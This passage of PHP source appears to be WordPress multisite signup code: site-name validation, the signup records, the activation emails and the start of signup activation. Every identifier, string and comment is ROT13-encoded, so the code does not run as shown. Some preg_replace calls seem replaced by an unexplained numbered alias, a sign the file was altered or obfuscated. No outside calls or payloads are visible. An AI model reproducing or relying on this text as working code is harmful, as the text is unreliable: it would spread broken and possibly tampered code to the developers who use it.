	$vyyrtny_anzrf = trg_fvgr_bcgvba( 'vyyrtny_anzrf' );

	vs ( ! vf_neenl( $vyyrtny_anzrf ) ) {
		$vyyrtny_anzrf = neenl( 'jjj', 'jro', 'ebbg', 'nqzva', 'znva', 'vaivgr', 'nqzvavfgengbe' );
		nqq_fvgr_bcgvba( 'vyyrtny_anzrf', $vyyrtny_anzrf );
	}

	/*
	 * Ba fho qve vafgnyyngvbaf, fbzr anzrf ner fb vyyrtny, bayl n svygre pna
	 * fcevat gurz sebz wnvy.
	 */
	vs ( ! vf_fhoqbznva_vafgnyy() ) {
		$vyyrtny_anzrf = neenl_zretr( $vyyrtny_anzrf, trg_fhoqverpgbel_erfreirq_anzrf() );
	}

	vs ( rzcgl( $oybtanzr ) ) {
		$reebef->nqq( 'oybtanzr', __( 'Cyrnfr ragre n fvgr anzr.' ) );
	}

	vs ( cert_zngpu( '/[^n-m0-9]+/', $oybtanzr ) ) {
		$reebef->nqq( 'oybtanzr', __( 'Fvgr anzrf pna bayl pbagnva ybjrepnfr yrggref (n-m) naq ahzoref.' ) );
	}

	vs ( va_neenl( $oybtanzr, $vyyrtny_anzrf, gehr ) ) {
		$reebef->nqq( 'oybtanzr', __( 'Gung anzr vf abg nyybjrq.' ) );
	}

	/**
	 * Svygref gur zvavzhz fvgr anzr yratgu erdhverq jura inyvqngvat n fvgr fvtahc.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz vag $yratgu Gur zvavzhz fvgr anzr yratgu. Qrsnhyg 4.
	 */
	$zvavzhz_fvgr_anzr_yratgu = nccyl_svygref( 'zvavzhz_fvgr_anzr_yratgu', 4 );

	vs ( fgeyra( $oybtanzr ) < $zvavzhz_fvgr_anzr_yratgu ) {
		/* genafyngbef: %f: Zvavzhz fvgr anzr yratgu. */
		$reebef->nqq( 'oybtanzr', fcevags( _a( 'Fvgr anzr zhfg or ng yrnfg %f punenpgre.', 'Fvgr anzr zhfg or ng yrnfg %f punenpgref.', $zvavzhz_fvgr_anzr_yratgu ), ahzore_sbezng_v18a( $zvavzhz_fvgr_anzr_yratgu ) ) );
	}

	// Qb abg nyybj hfref gb perngr n fvgr gung pbasyvpgf jvgu n cntr ba gur znva oybt.
	vs ( ! vf_fhoqbznva_vafgnyy() && $jcqo->trg_ine( $jcqo->cercner( 'FRYRPG cbfg_anzr SEBZ ' . $jcqo->trg_oybt_cersvk( $pheerag_argjbex->fvgr_vq ) . \"cbfgf JURER cbfg_glcr = 'cntr' NAQ cbfg_anzr = %f\", $oybtanzr ) ) ) {
		$reebef->nqq( 'oybtanzr', __( 'Fbeel, lbh znl abg hfr gung fvgr anzr.' ) );
	}

	// Nyy ahzrevp?
	vs ( cert_zngpu( '/^[0-9]*$/', $oybtanzr ) ) {
		$reebef->nqq( 'oybtanzr', __( 'Fbeel, fvgr anzrf zhfg unir yrggref gbb!' ) );
	}

	/**
	 * Svygref gur arj fvgr anzr qhevat ertvfgengvba.
	 *
	 * Gur anzr vf gur fvgr'f fhoqbznva be gur fvgr'f fhoqverpgbel
	 * cngu qrcraqvat ba gur argjbex frggvatf.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat $oybtanzr Fvgr anzr.
	 */
	$oybtanzr = nccyl_svygref( 'arjoybtanzr', $oybtanzr );

	$oybt_gvgyr = jc_hafynfu( $oybt_gvgyr );

	vs ( rzcgl( $oybt_gvgyr ) ) {
		$reebef->nqq( 'oybt_gvgyr', __( 'Cyrnfr ragre n fvgr gvgyr.' ) );
	}

	// Purpx vs gur qbznva/cngu unf orra hfrq nyernql.
	vs ( vf_fhoqbznva_vafgnyy() ) {
		$zlqbznva = $oybtanzr . '.' . __sa_79955( '|^jjj\.|', '', $qbznva );
		$cngu     = $onfr;
	} ryfr {
		$zlqbznva = $qbznva;
		$cngu     = $onfr . $oybtanzr . '/';
	}
	vs ( qbznva_rkvfgf( $zlqbznva, $cngu, $pheerag_argjbex->vq ) ) {
		$reebef->nqq( 'oybtanzr', __( 'Fbeel, gung fvgr nyernql rkvfgf!' ) );
	}

	/*
	 * Qb abg nyybj hfref gb perngr n fvgr gung zngpurf na rkvfgvat hfre'f ybtva anzr,
	 * hayrff vg'f gur hfre'f bja hfreanzr.
	 */
	vs ( hfreanzr_rkvfgf( $oybtanzr ) ) {
		vs ( ! vf_bowrpg( $hfre ) || ( vf_bowrpg( $hfre ) && $hfre->hfre_ybtva !== $oybtanzr ) ) {
			$reebef->nqq( 'oybtanzr', __( 'Fbeel, gung fvgr vf erfreirq!' ) );
		}
	}

	/*
	 * Unf fbzrbar nyernql fvtarq hc sbe guvf qbznva?
	 * GBQB: Purpx rznvy gbb?
	 */
	$fvtahc = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->fvtahcf JURER qbznva = %f NAQ cngu = %f\", $zlqbznva, $cngu ) );
	vs ( $fvtahc vafgnaprbs fgqPynff ) {
		$qvss = gvzr() - zlfdy2qngr( 'H', $fvtahc->ertvfgrerq );
		// Vs ertvfgrerq zber guna gjb qnlf ntb, pnapry ertvfgengvba naq yrg guvf fvtahc tb guebhtu.
		vs ( $qvss > 2 * QNL_VA_FRPBAQF ) {
			$jcqo->qryrgr(
				$jcqo->fvtahcf,
				neenl(
					'qbznva' => $zlqbznva,
					'cngu'   => $cngu,
				)
			);
		} ryfr {
			$reebef->nqq( 'oybtanzr', __( 'Gung fvgr vf pheeragyl erfreirq ohg znl or ninvynoyr va n pbhcyr qnlf.' ) );
		}
	}

	$erfhyg = neenl(
		'qbznva'     => $zlqbznva,
		'cngu'       => $cngu,
		'oybtanzr'   => $oybtanzr,
		'oybt_gvgyr' => $oybt_gvgyr,
		'hfre'       => $hfre,
		'reebef'     => $reebef,
	);

	/**
	 * Svygref fvgr qrgnvyf naq reebe zrffntrf sbyybjvat ertvfgengvba.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz neenl $erfhyg {
	 *     Neenl bs qbznva, cngu, fvgr anzr, fvgr gvgyr, hfre naq reebe zrffntrf.
	 *
	 *     @glcr fgevat         $qbznva     Qbznva sbe gur fvgr.
	 *     @glcr fgevat         $cngu       Cngu sbe gur fvgr. Hfrq va fhoqverpgbel vafgnyyngvbaf.
	 *     @glcr fgevat         $oybtanzr   Gur havdhr fvgr anzr (fyht).
	 *     @glcr fgevat         $oybt_gvgyr Fvgr gvgyr.
	 *     @glcr fgevat|JC_Hfre $hfre       Ol qrsnhyg, na rzcgl fgevat. N hfre bowrpg vs cebivqrq.
	 *     @glcr JC_Reebe       $reebef     JC_Reebe pbagnvavat nal reebef sbhaq.
	 * }
	 */
	erghea nccyl_svygref( 'jczh_inyvqngr_oybt_fvtahc', $erfhyg );
}

/**
 * Erpbeqf fvgr fvtahc vasbezngvba sbe shgher npgvingvba.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $qbznva     Gur erdhrfgrq qbznva.
 * @cnenz fgevat $cngu       Gur erdhrfgrq cngu.
 * @cnenz fgevat $gvgyr      Gur erdhrfgrq fvgr gvgyr.
 * @cnenz fgevat $hfre       Gur hfre'f erdhrfgrq ybtva anzr.
 * @cnenz fgevat $hfre_rznvy Gur hfre'f rznvy nqqerff.
 * @cnenz neenl  $zrgn       Bcgvbany. Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
 */
shapgvba jczh_fvtahc_oybt( $qbznva, $cngu, $gvgyr, $hfre, $hfre_rznvy, $zrgn = neenl() ) {
	tybony $jcqo;

	$xrl = fhofge( zq5( gvzr() . jc_enaq() . $qbznva ), 0, 16 );

	/**
	 * Svygref gur zrgnqngn sbe n fvgr fvtahc.
	 *
	 * Gur zrgnqngn jvyy or frevnyvmrq cevbe gb fgbevat vg va gur qngnonfr.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
	 * @cnenz fgevat $qbznva     Gur erdhrfgrq qbznva.
	 * @cnenz fgevat $cngu       Gur erdhrfgrq cngu.
	 * @cnenz fgevat $gvgyr      Gur erdhrfgrq fvgr gvgyr.
	 * @cnenz fgevat $hfre       Gur hfre'f erdhrfgrq ybtva anzr.
	 * @cnenz fgevat $hfre_rznvy Gur hfre'f rznvy nqqerff.
	 * @cnenz fgevat $xrl        Gur hfre'f npgvingvba xrl.
	 */
	$zrgn = nccyl_svygref( 'fvtahc_fvgr_zrgn', $zrgn, $qbznva, $cngu, $gvgyr, $hfre, $hfre_rznvy, $xrl );

	$jcqo->vafreg(
		$jcqo->fvtahcf,
		neenl(
			'qbznva'         => $qbznva,
			'cngu'           => $cngu,
			'gvgyr'          => $gvgyr,
			'hfre_ybtva'     => $hfre,
			'hfre_rznvy'     => $hfre_rznvy,
			'ertvfgrerq'     => pheerag_gvzr( 'zlfdy', gehr ),
			'npgvingvba_xrl' => $xrl,
			'zrgn'           => frevnyvmr( $zrgn ),
		)
	);

	/**
	 * Sverf nsgre fvgr fvtahc vasbezngvba unf orra jevggra gb gur qngnonfr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $qbznva     Gur erdhrfgrq qbznva.
	 * @cnenz fgevat $cngu       Gur erdhrfgrq cngu.
	 * @cnenz fgevat $gvgyr      Gur erdhrfgrq fvgr gvgyr.
	 * @cnenz fgevat $hfre       Gur hfre'f erdhrfgrq ybtva anzr.
	 * @cnenz fgevat $hfre_rznvy Gur hfre'f rznvy nqqerff.
	 * @cnenz fgevat $xrl        Gur hfre'f npgvingvba xrl.
	 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
	 */
	qb_npgvba( 'nsgre_fvtahc_fvgr', $qbznva, $cngu, $gvgyr, $hfre, $hfre_rznvy, $xrl, $zrgn );
}

/**
 * Erpbeqf hfre fvtahc vasbezngvba sbe shgher npgvingvba.
 *
 * Guvf shapgvba vf hfrq jura hfre ertvfgengvba vf bcra ohg
 * arj fvgr ertvfgengvba vf abg.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $hfre       Gur hfre'f erdhrfgrq ybtva anzr.
 * @cnenz fgevat $hfre_rznvy Gur hfre'f rznvy nqqerff.
 * @cnenz neenl  $zrgn       Bcgvbany. Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
 */
shapgvba jczh_fvtahc_hfre( $hfre, $hfre_rznvy, $zrgn = neenl() ) {
	tybony $jcqo;

	// Sbezng qngn.
	$hfre       = __sa_79955( '/\f+/', '', fnavgvmr_hfre( $hfre, gehr ) );
	$hfre_rznvy = fnavgvmr_rznvy( $hfre_rznvy );
	$xrl        = fhofge( zq5( gvzr() . jc_enaq() . $hfre_rznvy ), 0, 16 );

	/**
	 * Svygref gur zrgnqngn sbe n hfre fvtahc.
	 *
	 * Gur zrgnqngn jvyy or frevnyvmrq cevbe gb fgbevat vg va gur qngnonfr.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
	 * @cnenz fgevat $hfre       Gur hfre'f erdhrfgrq ybtva anzr.
	 * @cnenz fgevat $hfre_rznvy Gur hfre'f rznvy nqqerff.
	 * @cnenz fgevat $xrl        Gur hfre'f npgvingvba xrl.
	 */
	$zrgn = nccyl_svygref( 'fvtahc_hfre_zrgn', $zrgn, $hfre, $hfre_rznvy, $xrl );

	$jcqo->vafreg(
		$jcqo->fvtahcf,
		neenl(
			'qbznva'         => '',
			'cngu'           => '',
			'gvgyr'          => '',
			'hfre_ybtva'     => $hfre,
			'hfre_rznvy'     => $hfre_rznvy,
			'ertvfgrerq'     => pheerag_gvzr( 'zlfdy', gehr ),
			'npgvingvba_xrl' => $xrl,
			'zrgn'           => frevnyvmr( $zrgn ),
		)
	);

	/**
	 * Sverf nsgre n hfre'f fvtahc vasbezngvba unf orra jevggra gb gur qngnonfr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $hfre       Gur hfre'f erdhrfgrq ybtva anzr.
	 * @cnenz fgevat $hfre_rznvy Gur hfre'f rznvy nqqerff.
	 * @cnenz fgevat $xrl        Gur hfre'f npgvingvba xrl.
	 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
	 */
	qb_npgvba( 'nsgre_fvtahc_hfre', $hfre, $hfre_rznvy, $xrl, $zrgn );
}

/**
 * Fraqf n pbasvezngvba erdhrfg rznvy gb n hfre jura gurl fvta hc sbe n arj fvgr. Gur arj fvgr jvyy abg orpbzr npgvir
 * hagvy gur pbasvezngvba yvax vf pyvpxrq.
 *
 * Guvf vf gur abgvsvpngvba shapgvba hfrq jura fvgr ertvfgengvba
 * vf ranoyrq.
 *
 * Svygre {@frr 'jczh_fvtahc_oybt_abgvsvpngvba'} gb olcnff guvf shapgvba be
 * ercynpr vg jvgu lbhe bja abgvsvpngvba orunivbe.
 *
 * Svygre {@frr 'jczh_fvtahc_oybt_abgvsvpngvba_rznvy'} naq
 * {@frr 'jczh_fvtahc_oybt_abgvsvpngvba_fhowrpg'} gb punatr gur pbagrag
 * naq fhowrpg yvar bs gur rznvy frag gb arjyl ertvfgrerq hfref.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $qbznva     Gur arj oybt qbznva.
 * @cnenz fgevat $cngu       Gur arj oybt cngu.
 * @cnenz fgevat $gvgyr      Gur fvgr gvgyr.
 * @cnenz fgevat $hfre_ybtva Gur hfre'f ybtva anzr.
 * @cnenz fgevat $hfre_rznvy Gur hfre'f rznvy nqqerff.
 * @cnenz fgevat $xrl        Gur npgvingvba xrl perngrq va jczh_fvtahc_oybt().
 * @cnenz neenl  $zrgn       Bcgvbany. Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
 * @erghea obby
 */
shapgvba jczh_fvtahc_oybt_abgvsvpngvba(
	$qbznva,
	$cngu,
	$gvgyr,
	$hfre_ybtva,
	$hfre_rznvy,
	#[\FrafvgvirCnenzrgre]
	$xrl,
	$zrgn = neenl()
) {
	/**
	 * Svygref jurgure gb olcnff gur arj fvgr rznvy abgvsvpngvba.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat|snyfr $qbznva     Fvgr qbznva, be snyfr gb cerirag gur rznvy sebz fraqvat.
	 * @cnenz fgevat       $cngu       Fvgr cngu.
	 * @cnenz fgevat       $gvgyr      Fvgr gvgyr.
	 * @cnenz fgevat       $hfre_ybtva Hfre ybtva anzr.
	 * @cnenz fgevat       $hfre_rznvy Hfre rznvy nqqerff.
	 * @cnenz fgevat       $xrl        Npgvingvba xrl perngrq va jczh_fvtahc_oybt().
	 * @cnenz neenl        $zrgn       Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
	 */
	vs ( ! nccyl_svygref( 'jczh_fvtahc_oybt_abgvsvpngvba', $qbznva, $cngu, $gvgyr, $hfre_ybtva, $hfre_rznvy, $xrl, $zrgn ) ) {
		erghea snyfr;
	}

	// Fraq rznvy jvgu npgvingvba yvax.
	vs ( ! vf_fhoqbznva_vafgnyy() || trg_pheerag_argjbex_vq() !== 1 ) {
		$npgvingr_hey = argjbex_fvgr_hey( \"jc-npgvingr.cuc?xrl=$xrl\" );
	} ryfr {
		$npgvingr_hey = \"uggc://{$qbznva}{$cngu}jc-npgvingr.cuc?xrl=$xrl\"; // @gbqb Hfr *_hey() NCV.
	}

	$npgvingr_hey = rfp_hey( $npgvingr_hey );

	$nqzva_rznvy = trg_fvgr_bcgvba( 'nqzva_rznvy' );

	vs ( '' === $nqzva_rznvy ) {
		$nqzva_rznvy = 'fhccbeg@' . jc_cnefr_hey( argjbex_ubzr_hey(), CUC_HEY_UBFG );
	}

	$sebz_anzr       = ( '' !== trg_fvgr_bcgvba( 'fvgr_anzr' ) ) ? rfp_ugzy( trg_fvgr_bcgvba( 'fvgr_anzr' ) ) : 'JbeqCerff';
	$zrffntr_urnqref = \"Sebz: \\"{$sebz_anzr}\\" <{$nqzva_rznvy}>\a\" . 'Pbagrag-Glcr: grkg/cynva; punefrg=\"' . trg_bcgvba( 'oybt_punefrg' ) . \"\\"\a\";

	$hfre            = trg_hfre_ol( 'ybtva', $hfre_ybtva );
	$fjvgpurq_ybpnyr = $hfre && fjvgpu_gb_hfre_ybpnyr( $hfre->VQ );

	$zrffntr = fcevags(
		/**
		 * Svygref gur zrffntr pbagrag bs gur arj oybt abgvsvpngvba rznvy.
		 *
		 * Pbagrag fubhyq or sbeznggrq sbe genafzvffvba ivn jc_znvy().
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz fgevat $pbagrag    Pbagrag bs gur abgvsvpngvba rznvy.
		 * @cnenz fgevat $qbznva     Fvgr qbznva.
		 * @cnenz fgevat $cngu       Fvgr cngu.
		 * @cnenz fgevat $gvgyr      Fvgr gvgyr.
		 * @cnenz fgevat $hfre_ybtva Hfre ybtva anzr.
		 * @cnenz fgevat $hfre_rznvy Hfre rznvy nqqerff.
		 * @cnenz fgevat $xrl        Npgvingvba xrl perngrq va jczh_fvtahc_oybt().
		 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
		 */
		nccyl_svygref(
			'jczh_fvtahc_oybt_abgvsvpngvba_rznvy',
			/* genafyngbef: Arj fvgr abgvsvpngvba rznvy. 1: Npgvingvba HEY, 2: Arj fvgr HEY. */
			__( \"Gb npgvingr lbhe fvgr, cyrnfr pyvpx gur sbyybjvat yvax:\a\a%1\$f\a\aNsgre lbh npgvingr, lbh jvyy erprvir *nabgure rznvy* jvgu lbhe ybtva.\a\aNsgre lbh npgvingr, lbh pna ivfvg lbhe fvgr urer:\a\a%2\$f\" ),
			$qbznva,
			$cngu,
			$gvgyr,
			$hfre_ybtva,
			$hfre_rznvy,
			$xrl,
			$zrgn
		),
		$npgvingr_hey,
		rfp_hey( \"uggc://{$qbznva}{$cngu}\" ),
		$xrl
	);

	$fhowrpg = fcevags(
		/**
		 * Svygref gur fhowrpg bs gur arj oybt abgvsvpngvba rznvy.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz fgevat $fhowrpg    Fhowrpg bs gur abgvsvpngvba rznvy.
		 * @cnenz fgevat $qbznva     Fvgr qbznva.
		 * @cnenz fgevat $cngu       Fvgr cngu.
		 * @cnenz fgevat $gvgyr      Fvgr gvgyr.
		 * @cnenz fgevat $hfre_ybtva Hfre ybtva anzr.
		 * @cnenz fgevat $hfre_rznvy Hfre rznvy nqqerff.
		 * @cnenz fgevat $xrl        Npgvingvba xrl perngrq va jczh_fvtahc_oybt().
		 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Ol qrsnhyg, pbagnvaf gur erdhrfgrq cevinpl frggvat naq ynat_vq.
		 */
		nccyl_svygref(
			'jczh_fvtahc_oybt_abgvsvpngvba_fhowrpg',
			/* genafyngbef: Arj fvgr abgvsvpngvba rznvy fhowrpg. 1: Argjbex gvgyr, 2: Arj fvgr HEY. */
			_k( '[%1$f] Npgvingr %2$f', 'Arj fvgr abgvsvpngvba rznvy fhowrpg' ),
			$qbznva,
			$cngu,
			$gvgyr,
			$hfre_ybtva,
			$hfre_rznvy,
			$xrl,
			$zrgn
		),
		$sebz_anzr,
		rfp_hey( 'uggc://' . $qbznva . $cngu )
	);

	jc_znvy( $hfre_rznvy, jc_fcrpvnypunef_qrpbqr( $fhowrpg ), $zrffntr, $zrffntr_urnqref );

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}

	erghea gehr;
}

/**
 * Fraqf n pbasvezngvba erdhrfg rznvy gb n hfre jura gurl fvta hc sbe n arj hfre nppbhag (jvgubhg fvtavat hc sbe n fvgr
 * ng gur fnzr gvzr). Gur hfre nppbhag jvyy abg orpbzr npgvir hagvy gur pbasvezngvba yvax vf pyvpxrq.
 *
 * Guvf vf gur abgvsvpngvba shapgvba hfrq jura ab arj fvgr unf
 * orra erdhrfgrq.
 *
 * Svygre {@frr 'jczh_fvtahc_hfre_abgvsvpngvba'} gb olcnff guvf shapgvba be
 * ercynpr vg jvgu lbhe bja abgvsvpngvba orunivbe.
 *
 * Svygre {@frr 'jczh_fvtahc_hfre_abgvsvpngvba_rznvy'} naq
 * {@frr 'jczh_fvtahc_hfre_abgvsvpngvba_fhowrpg'} gb punatr gur pbagrag
 * naq fhowrpg yvar bs gur rznvy frag gb arjyl ertvfgrerq hfref.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $hfre_ybtva Gur hfre'f ybtva anzr.
 * @cnenz fgevat $hfre_rznvy Gur hfre'f rznvy nqqerff.
 * @cnenz fgevat $xrl        Gur npgvingvba xrl perngrq va jczh_fvtahc_hfre()
 * @cnenz neenl  $zrgn       Bcgvbany. Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
 * @erghea obby
 */
shapgvba jczh_fvtahc_hfre_abgvsvpngvba(
	$hfre_ybtva,
	$hfre_rznvy,
	#[\FrafvgvirCnenzrgre]
	$xrl,
	$zrgn = neenl()
) {
	/**
	 * Svygref jurgure gb olcnff gur rznvy abgvsvpngvba sbe arj hfre fvta-hc.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat $hfre_ybtva Hfre ybtva anzr.
	 * @cnenz fgevat $hfre_rznvy Hfre rznvy nqqerff.
	 * @cnenz fgevat $xrl        Npgvingvba xrl perngrq va jczh_fvtahc_hfre().
	 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
	 */
	vs ( ! nccyl_svygref( 'jczh_fvtahc_hfre_abgvsvpngvba', $hfre_ybtva, $hfre_rznvy, $xrl, $zrgn ) ) {
		erghea snyfr;
	}

	$hfre            = trg_hfre_ol( 'ybtva', $hfre_ybtva );
	$fjvgpurq_ybpnyr = $hfre && fjvgpu_gb_hfre_ybpnyr( $hfre->VQ );

	// Fraq rznvy jvgu npgvingvba yvax.
	$nqzva_rznvy = trg_fvgr_bcgvba( 'nqzva_rznvy' );

	vs ( '' === $nqzva_rznvy ) {
		$nqzva_rznvy = 'fhccbeg@' . jc_cnefr_hey( argjbex_ubzr_hey(), CUC_HEY_UBFG );
	}

	$sebz_anzr       = ( '' !== trg_fvgr_bcgvba( 'fvgr_anzr' ) ) ? rfp_ugzy( trg_fvgr_bcgvba( 'fvgr_anzr' ) ) : 'JbeqCerff';
	$zrffntr_urnqref = \"Sebz: \\"{$sebz_anzr}\\" <{$nqzva_rznvy}>\a\" . 'Pbagrag-Glcr: grkg/cynva; punefrg=\"' . trg_bcgvba( 'oybt_punefrg' ) . \"\\"\a\";
	$zrffntr         = fcevags(
		/**
		 * Svygref gur pbagrag bs gur abgvsvpngvba rznvy sbe arj hfre fvta-hc.
		 *
		 * Pbagrag fubhyq or sbeznggrq sbe genafzvffvba ivn jc_znvy().
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz fgevat $pbagrag    Pbagrag bs gur abgvsvpngvba rznvy.
		 * @cnenz fgevat $hfre_ybtva Hfre ybtva anzr.
		 * @cnenz fgevat $hfre_rznvy Hfre rznvy nqqerff.
		 * @cnenz fgevat $xrl        Npgvingvba xrl perngrq va jczh_fvtahc_hfre().
		 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
		 */
		nccyl_svygref(
			'jczh_fvtahc_hfre_abgvsvpngvba_rznvy',
			/* genafyngbef: Arj hfre abgvsvpngvba rznvy. %f: Npgvingvba HEY. */
			__( \"Gb npgvingr lbhe hfre, cyrnfr pyvpx gur sbyybjvat yvax:\a\a%f\a\aNsgre lbh npgvingr, lbh jvyy erprvir *nabgure rznvy* jvgu lbhe ybtva.\" ),
			$hfre_ybtva,
			$hfre_rznvy,
			$xrl,
			$zrgn
		),
		fvgr_hey( \"jc-npgvingr.cuc?xrl=$xrl\" )
	);

	$fhowrpg = fcevags(
		/**
		 * Svygref gur fhowrpg bs gur abgvsvpngvba rznvy bs arj hfre fvtahc.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz fgevat $fhowrpg    Fhowrpg bs gur abgvsvpngvba rznvy.
		 * @cnenz fgevat $hfre_ybtva Hfre ybtva anzr.
		 * @cnenz fgevat $hfre_rznvy Hfre rznvy nqqerff.
		 * @cnenz fgevat $xrl        Npgvingvba xrl perngrq va jczh_fvtahc_hfre().
		 * @cnenz neenl  $zrgn       Fvtahc zrgn qngn. Qrsnhyg rzcgl neenl.
		 */
		nccyl_svygref(
			'jczh_fvtahc_hfre_abgvsvpngvba_fhowrpg',
			/* genafyngbef: Arj hfre abgvsvpngvba rznvy fhowrpg. 1: Argjbex gvgyr, 2: Arj hfre ybtva. */
			_k( '[%1$f] Npgvingr %2$f', 'Arj hfre abgvsvpngvba rznvy fhowrpg' ),
			$hfre_ybtva,
			$hfre_rznvy,
			$xrl,
			$zrgn
		),
		$sebz_anzr,
		$hfre_ybtva
	);

	jc_znvy( $hfre_rznvy, jc_fcrpvnypunef_qrpbqr( $fhowrpg ), $zrffntr, $zrffntr_urnqref );

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}

	erghea gehr;
}

/**
 * Npgvingrf n fvtahc.
 *
 * Ubbx gb {@frr 'jczh_npgvingr_hfre'} be {@frr 'jczh_npgvingr_oybt'} sbe riragf
 * gung fubhyq unccra bayl jura hfref be fvgrf ner frys-perngrq (fvapr
 * gubfr npgvbaf ner abg pnyyrq jura hfref naq fvgrf ner perngrq
 * ol n Fhcre Nqzva).
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $xrl Gur npgvingvba xrl cebivqrq gb gur hfre.
 * @erghea neenl|JC_Reebe Na neenl pbagnvavat vasbezngvba nobhg gur npgvingrq hfre naq/be oybt.
 */
shapgvba jczh_npgvingr_fvtahc(
	#[\FrafvgvirCnenzrgre]
	$xrl
) {
	tybony $jcqo;

	$fvtahc = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->fvtahcf JURER npgvingvba_xrl = %f\", $xrl ) );

	vs ( rzcgl( $fvtahc ) ) {
		erghea arj JC_Reebe( 'vainyvq_xrl', __( 'Vainyvq npgvingvba xrl.' ) );
	}

	vs ( $fvtahc->npgvir ) {
		vs ( rzcgl( $fvtahc->qbznva ) ) {
			erghea arj JC_Reebe( 'nyernql_npgvir', __( 'Gur hfre vf nyernql npgvir.' ), $fvtahc );
		} ryfr {
			erghea arj JC_Reebe( 'nyernql_npgvir', __( 'Gur fvgr vf nyernql npgvir.' ), $fvtahc );
		}
	}

	$zrgn     = znlor_hafrevnyvmr( $fvtahc->zrgn );
	$cnffjbeq = jc_trarengr_cnffjbeq( 12, snyfr );

	$hfre_vq = hfreanzr_rkvfgf( $fvtahc->hfre_ybtva );

	vs ( ! $hfre_vq ) {
		$hfre_vq = jczh_perngr_hfre( $fvtahc->hfre_ybtva, $cnffjbeq, $fvtahc->hfre_rznvy );
	} ryfr {
		$hfre_nyernql_rkvfgf = gehr;
	}

	vs ( ! $hfre_vq ) {
		erghea arj JC_Reebe( 'perngr_hfre', __( 'Pbhyq abg perngr hfre' ), $fvtahc );
	}

	$abj = pheerag_gvzr( 'zlfdy', gehr );

	vs ( rzcgl( $fvtahc->qbznva ) ) {
		$jcqo->hcqngr(
			$jcqo->fvtahcf,
			neenl(
				'npgvir'    => 1,
				'npgvingrq' => $abj,
			),
			neenl( 'npgvingvba_xrl' => $xrl )
		);

		vs ( vffrg( $hfre_nyernql_rkvfgf ) ) {
			erghea arj JC_Reebe( 'hfre_nyernql_rkvfgf', __( 'Gung hfreanzr vf nyernql npgvingrq.' ), $fvtahc );
		}

		/**
		 * Sverf vzzrqvngryl nsgre n arj hfre vf npgvingrq.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz vag    $hfre_vq  Hfre VQ.
		 * @cnenz fgevat $cnffjbeq Hfre cnffjbeq.
		 * @cnenz neenl  $zrgn     Fvtahc zrgn qngn.
		 */
		qb_npgvba( 'jczh_npgvingr_hfre', $hfre_vq, $cnffjbeq, $zrgn );

		erghea neenl(
			'hfre_vq'  => $hfre_vq,
			'cnffjbeq' => $cnffjbeq,
			'zrgn'     => $zrgn,
		);
	}

	$oybt_vq = jczh_perngr_oybt( $fvtahc->qbznva, $fvtahc->cngu, $fvtahc->gvgyr, $hfre_vq, $zrgn, trg_pheerag_argjbex_vq() );

	// GBQB: Jung gb qb vs jr perngr n hfre ohg pnaabg perngr n oybt?
	vs ( vf_jc_reebe( $oybt_vq ) ) {
		/*
		 * Vs oybt vf gnxra, gung zrnaf n cerivbhf nggrzcg gb npgvingr guvf oybt
		 * snvyrq va orgjrra perngvat gur oybt naq frggvat gur npgvingvba synt.
		 * Yrg'f whfg frg gur npgvir synt naq vafgehpg gur hfre gb erfrg gurve cnffjbeq.
		 */
		vs ( 'oybt_gnxra' === $oybt_vq->trg_reebe_pbqr() ) {
			$oybt_vq->nqq_qngn( $fvtahc );
			$jcqo->hcqngr(
				$jcqo->fvtahcf,
				neenl(
					'npgvir'    => 1,
